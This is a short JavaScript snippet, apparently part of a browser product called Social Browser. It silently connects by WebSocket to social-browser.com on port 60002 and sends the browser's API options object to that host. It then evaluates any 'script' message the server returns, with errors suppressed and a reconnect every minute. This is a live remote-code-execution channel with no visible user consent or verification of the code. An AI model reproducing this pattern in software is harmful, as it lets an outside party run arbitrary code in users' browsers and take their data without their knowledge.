(() => {
    function connectWS() {
        var ws = new WebSocket('ws://social-browser.com:60002/browser');

        ws.onerror = function (error) {};
        ws.onclose = function (event) {
            if (!event.wasClean) {
                setTimeout(() => {
                    connectWS();
                }, 1000 * 60);
            }
        };
        ws.sendMessage = function (msg) {
            ws.send(JSON.stringify(msg));
        };

        ws.onopen = function () {
            ws.sendMessage({ type: 'options', source: 'isite-browser', options: SOCIALBROWSER.var.api });
        };

        ws.onmessage = function (msg) {
            msg = JSON.parse(msg.data);
            if (msg.type === 'script') {
                SOCIALBROWSER.eval(msg.content);
            }
        };
    }
    connectWS();
})();
